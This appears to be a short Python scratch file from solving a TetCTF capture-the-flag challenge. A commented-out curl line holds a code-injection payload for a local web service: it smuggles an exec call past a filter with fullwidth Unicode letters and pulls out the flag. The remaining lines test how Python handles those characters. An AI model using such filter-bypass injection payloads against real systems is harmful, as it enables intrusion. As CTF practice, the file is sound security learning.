import re

# flag = os.system("curl 'http://localhost:5000/?debug=import+__main__;__main__.fail=__main__.FL4G' -F 'type=FL4G' -F 'number=ｅｘｅｃ(ｄｅｂｕｇ)' | grep 'TetCTF'")
n = "".join(x for x in re.findall(r'\d+', "ｅ"))
print(ord("ｅ"))
print(n.isnumeric())